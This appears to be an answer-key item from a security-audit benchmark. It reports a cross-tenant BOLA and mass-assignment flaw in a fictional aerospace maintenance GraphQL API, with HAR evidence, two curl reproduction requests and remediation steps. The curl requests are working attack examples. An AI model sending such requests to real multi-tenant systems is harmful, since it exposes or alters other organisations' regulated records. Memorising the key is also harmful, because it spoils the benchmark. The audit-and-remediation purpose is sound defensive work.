# Expected Response

## System
- Domain: Aerospace / MRO
- System: WingTech Maintenance Portal
- Example ID: GQL-0076

## Priority Findings

### Finding 1: Mass Assignment via Object Fields — Cross-Tenant Maintenance Record Takeover (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA / Mass Assignment

**Summary:**
Per §5.0 (Pattern 1.12 — mass assignment via object fields): The `getResource`/`listResources` resolvers accept client-supplied `tenantId` without verifying it against the JWT. An attacker from `tenant-c9ed` passed `tenantId: "tenant-1559"` in `listResources` to enumerate aircraft maintenance records belonging to another operator. In aerospace MRO, this exposes airworthiness records, maintenance schedules, and component traceability data regulated under EASA/FAA Part 145.

**Evidence from HAR:**
- Request: `POST https://api.wingtech-mainten.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-c9ed`
- Query: `listResources(tenantId: "tenant-1559") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-1559"`, `ownerId: "other-user-c9ed1559"`, `sensitiveField: "CONFIDENTIAL-c9ed1559"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-c9ed1559`

**Root Cause (§4.0 RISK-GQL-076):** `listResources` trusts client-supplied `tenantId`; object fields writable via mass assignment in mutations.

## Steps to Reproduce

### Step 1 — Cross-tenant maintenance record list (HAR)
```bash
curl -s -X POST https://api.wingtech-mainten.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c9ed" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-1559\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-c9ed1559` from `tenant-1559`. **Secure:** FORBIDDEN.

### Step 2 — Mass assignment via mutation input fields
```bash
curl -s -X POST https://api.wingtech-mainten.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c9ed" \
  -d '{"query": "mutation { updateResource(id: \"R-2076\", input: {status: \"approved\", ownerId: \"attacker-c9ed1559\", tenantId: \"tenant-1559\"}) { resourceId status } }"}'
```
**Vulnerable:** Mass assignment of `ownerId` and `tenantId` accepted.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client-supplied argument.
2. Strip `ownerId`, `tenantId` from all `ResourceInput` types — never client-writable.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
